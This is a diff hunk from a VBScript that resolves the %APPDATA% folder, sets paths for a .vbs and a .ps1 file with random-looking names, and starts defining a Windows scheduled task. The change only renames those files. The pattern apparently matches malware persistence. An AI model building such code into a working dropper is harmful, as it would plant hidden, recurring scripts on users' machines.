@@ -4,8 +4,8 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 appDataPath = sh.ExpandEnvironmentStrings("%APPDATA%")
 Set folder = fso.GetFolder(appDataPath)
-vbFile = folder & "\poiulkjh.vbs"
-psFile = folder & "\poiulkjh.ps1"
+vbFile = folder & "\plkjhgyuilkjhgfrtyuikjhgfghjkl.vbs"
+psFile = folder & "\plkjhgyuilkjhgfrtyuikjhgfghjkl.ps1"
 service.Connect
 Set rootFolder = service.GetFolder("\")  
 Set taskDef = service.NewTask(0)
